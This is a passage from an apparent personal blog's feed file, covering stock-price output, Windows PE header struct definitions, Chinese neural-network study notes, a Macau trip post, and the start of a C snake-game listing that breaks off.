class="line">2019-03-26  180.649994  177.095001  ...   7897900  178.080002</span><br><span class="line">2019-03-27  179.830002  176.912994  ...   8371000  177.029999</span><br><span class="line">2019-03-28  178.529999  175.970001  ...   7233000  177.729996</span><br><span class="line">2019-03-29  182.600006  179.000000  ...  13850900  182.449997</span><br><span class="line">2019-04-01  185.559998  180.889999  ...  12714800  180.889999</span><br><span class="line">2019-04-02  183.563004  180.949997  ...   8021500  181.740005</span><br><span class="line">2019-04-03  180.699997  176.759995  ...  26819000  178.320007</span><br><span class="line">2019-04-04  181.960007  176.889999  ...  16993200  181.070007</span><br><span class="line">2019-04-05  185.500000  182.000000  ...  18705000  185.350006</span><br><span class="line">2019-04-08  187.820007  184.009995  ...  14725600  186.500000</span><br><span class="line">2019-04-09  187.889999  186.160004  ...  11578200  187.190002</span><br><span class="line">2019-04-10  187.399994  184.000000  ...  10655000  186.190002</span><br><span class="line">2019-04-11  186.059998  183.750000  ...   8900300  184.979996</span><br><span class="line">2019-04-12  189.789993  187.139999  ...  12600000  188.910004</span><br><span class="line">2019-04-15  188.169998  182.559998  ...  14616600  183.070007</span><br><span class="line">2019-04-16  185.789993  183.399994  ...  12195900  185.779999</span><br><span class="line">...                ...         ...  ...       ...         ...</span><br><span class="line">2020-01-24  219.830002  211.324997  ...  18143900  213.750000</span><br><span class="line">2020-01-27  208.020004  199.500000  ...  24574700  205.470001</span><br><span class="line">2020-01-28  210.910004  207.169998  ...  16196700  210.229996</span><br><span class="line">2020-01-29  213.979996  209.520004  ...  12871900  212.020004</span><br><span class="line">2020-01-30  209.860001  205.029999  ...  14376000  208.580002</span><br><span class="line">2020-01-31  207.929993  204.727997  ...  18181400  206.589996</span><br><span class="line">2020-02-03  215.020004  208.669998  ...  14131900  213.100006</span><br><span class="line">2020-02-04  224.380005  220.490005  ...  16695100  222.880005</span><br><span class="line">2020-02-05  226.699997  217.539993  ...  15766100  220.220001</span><br><span class="line">2020-02-06  223.649994  219.779999  ...  10790800  220.899994</span><br><span class="line">2020-02-07  217.839996  214.880005  ...  13790300  216.529999</span><br><span class="line">2020-02-10  215.770004  212.199997  ...  17420300  215.770004</span><br><span class="line">2020-02-11  220.009995  215.289993  ...  16073500  217.210007</span><br><span class="line">2020-02-12  225.520004  220.210007  ...  18671900  224.309998</span><br><span class="line">2020-02-13  225.000000  218.990005  ...  28069700  220.360001</span><br><span class="line">2020-02-14  221.639999  218.229996  ...  10690000  219.630005</span><br><span class="line">2020-02-18  220.850006  217.509995  ...  12987000  220.520004</span><br><span class="line">2020-02-19  223.559998  220.750000  ...  10798100  222.139999</span><br><span class="line">2020-02-20  222.500000  214.220001  ...  14950100  218.039993</span><br><span class="line">2020-02-21  217.600006  211.559998  ...  17681200  212.589996</span><br><span class="line">2020-02-24  207.279999  202.509995  ...  19380200  206.160004</span><br><span class="line">2020-02-25  209.949997  204.100006  ...  18132400  205.610001</span><br><span class="line">2020-02-26  213.080002  206.789993  ...  19482100  208.740005</span><br><span class="line">2020-02-27  209.970001  201.860001  ...  22741200  205.029999</span><br><span class="line">2020-02-28  208.919998  198.561005  ...  31276200  208.000000</span><br><span class="line">2020-03-02  211.110001  203.755997  ...  21542200  210.979996</span><br><span class="line">2020-03-03  211.389999  202.240005  ...  20813800  207.410004</span><br><span class="line">2020-03-04  212.699997  208.850006  ...  12474400  211.960007</span><br><span class="line">2020-03-05  215.149994  209.139999  ...  13462900  211.460007</span><br><span class="line">2020-03-06  207.000000  201.100006  ...  21679700  204.639999</span><br><span class="line"></span><br><span class="line">[254 rows x 6 columns]</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows PE structure. PE 相关结构体定义</title>
      <link href="/2020/03/29/system/pe_file/"/>
      <url>/2020/03/29/system/pe_file/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DOS头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PE头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PE文件头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16</span></span><br><span class="line"><span class="comment">//PE扩展头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line">    DWORD   ImageBase;            <span class="comment">//exe:0x40000h,  dll:0x10000000h</span></span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//数据目录表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"><span class="comment">//块表头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输入表结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                 </span><br><span class="line">    DWORD   ForwarderChain;            </span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//INT、 IAT</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定输入表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BOUND_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    OffsetModuleName;</span><br><span class="line">    WORD    NumberOfModuleForwarderRefs;</span><br><span class="line"><span class="comment">// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows</span></span><br><span class="line">&#125; IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BOUND_FORWARDER_REF</span> &#123;</span></span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    OffsetModuleName;</span><br><span class="line">    WORD    Reserved;</span><br><span class="line">&#125; IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//重定位表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//资源目录结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;   <span class="comment">//理论上为资源的属性，不过事实上总是0</span></span><br><span class="line">    DWORD   TimeDateStamp; <span class="comment">//资源产生的时刻</span></span><br><span class="line">    WORD    MajorVersion; <span class="comment">//资源版本，不过事实上总是0</span></span><br><span class="line">    WORD    MinorVersion; <span class="comment">//</span></span><br><span class="line">    WORD    NumberOfNamedEntries; <span class="comment">//以名称(字符串)命名的入口数量</span></span><br><span class="line">    WORD    NumberOfIdEntries; <span class="comment">//以ID(整型数字)命名的入口数量</span></span><br><span class="line"><span class="comment">//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD NameOffset:<span class="number">31</span>;</span><br><span class="line">            DWORD NameIsString:<span class="number">1</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">        DWORD   Name; <span class="comment">//目录项的名称字符串指针(0:ID)</span></span><br><span class="line">        WORD    Id;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   OffsetToData; <span class="comment">//目录项指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD   OffsetToDirectory:<span class="number">31</span>;</span><br><span class="line">            DWORD   DataIsDirectory:<span class="number">1</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME2;</span><br><span class="line">    &#125; DUMMYUNIONNAME2;</span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIR_STRING_U</span> &#123;</span></span><br><span class="line">    WORD    Length; <span class="comment">//字符串的长度</span></span><br><span class="line">    WCHAR   NameString[ <span class="number">1</span> ]; <span class="comment">//UNICODE字符串</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DATA_ENTRY</span> &#123;</span></span><br><span class="line">    DWORD   OffsetToData; <span class="comment">//资源数据的RVA</span></span><br><span class="line">    DWORD   Size; <span class="comment">//资源数据的长度</span></span><br><span class="line">    DWORD   CodePage; <span class="comment">//代码页，一般为0</span></span><br><span class="line">    DWORD   Reserved; <span class="comment">//保留字段</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> clang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Neural Network 0x02- Optimization. 神经网络笔记 -- 优化手段</title>
      <link href="/2019/07/04/deep_learning/note_neural_network2/"/>
      <url>/2019/07/04/deep_learning/note_neural_network2/</url>
      
        <content type="html"><![CDATA[<h1 id="正则化-Regularization"><a href="#正则化-Regularization" class="headerlink" title="正则化(Regularization)"></a>正则化(Regularization)</h1><p>深度学习可能存在过拟合问题，有两个解决方法，一个是正则化，另一个是准备更多的数据。</p><p>至于为什么起作用这篇笔记讲得 very good:<br><a href="http://www.ai-start.com/dl2017/html/lesson2-week1.html#header-n119">http://www.ai-start.com/dl2017/html/lesson2-week1.html#header-n119</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
            <tag> ai </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Neural Network 0x01- Check the Shape. 神经网络笔记 -- 核对矩阵的维度</title>
      <link href="/2019/07/01/deep_learning/note_neural_network1/"/>
      <url>/2019/07/01/deep_learning/note_neural_network1/</url>
      
        <content type="html"><![CDATA[<h1 id="先落结论"><a href="#先落结论" class="headerlink" title="先落结论"></a>先落结论</h1><p>用 n[l] 表示第 l 层神经元的数量, w[l] 为第 l 层的权重, b[l] 为偏置<br>z[l] 表示未激活前的矩阵(也就是wx+b的结果), a[l] 表示激活 z[l] 后(第 l 层的输出)的矩阵<br>那么正确的神经网络各矩阵的维度应该为:<br>w[l]: (n[l], n[l - 1])<br>b[l]: (n[l], 1)<br>a[l], z[l]: (n[l], 1)<br>当输入多个训练集m, w[l] 维度不变(因为神经元数量 n[l] 和 n[l - 1] 没有改变), 而 z[l], a[l] 变为 (n[l], m).  </p><h1 id="推导过程"><a href="#推导过程" class="headerlink" title="推导过程"></a>推导过程</h1><p>简单地说就是要满足矩阵乘法的正确性.  </p><p>假设只有 1 个训练集, 我们知道第 l 层神经网络如下:<br>z[l] = w[l] a[l - 1] + b[l]<br>a[l] = g<a href="z%5Bl%5D">l</a></p><p>我们知道在第 l - 1 层有 n[l - 1] 个神经元, 那么上一层的输出 a[l - 1] 一定是 (n[l - 1], 1) 的, 假设 w[l] 有 k行j列, 那么:<br>(k, j) * (n[l - 1], 1) + (n[l], 1), 根据矩阵乘法我们显然可以知道 j 一定为 n[l - 1], 由于当前层有 n[l] 个神经元, 所以要分配一个 n[l] 行的矩阵给 w[l] (k = n[l]).<br>于是 w[l]: (n[l], n[l - 1])</p><p>激活函数是个向量化的函数, 显然可以得到 z[l] 和 a[l] 的维度是相等的.  </p>]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
            <tag> ai </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>澳门周末一日游.</title>
      <link href="/2018/09/09/happytime/macao/"/>
      <url>/2018/09/09/happytime/macao/</url>
      
        <content type="html"><![CDATA[<h1 id="路程"><a href="#路程" class="headerlink" title="路程"></a>路程</h1><p>home -&gt; 行路 -&gt; 地铁 -&gt; 高铁 -&gt; 珠海拱北 -&gt; 过关 -&gt; 到步 = 总共2h<br>so 来回时间 = 2h * 2 = 4h </p><h1 id="澳门地标"><a href="#澳门地标" class="headerlink" title="澳门地标"></a>澳门地标</h1><p><img src="/images/self/3.jpg" alt="img">  </p><h1 id="街边电单车"><a href="#街边电单车" class="headerlink" title="街边电单车:"></a>街边电单车:</h1><p><img src="/images/self/1.jpg" alt="img">  </p><h1 id="与巴黎人合照"><a href="#与巴黎人合照" class="headerlink" title="与巴黎人合照:"></a>与巴黎人合照:</h1><p><img src="/images/self/2.jpg" alt="img">  </p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>猪扒包好正.<br>下次够十八岁来赌场支持下何生!!!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言贪吃蛇源代码收藏</title>
      <link href="/2018/08/29/c-lang/snake_in_c/"/>
      <url>/2018/08/29/c-lang/snake_in_c/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 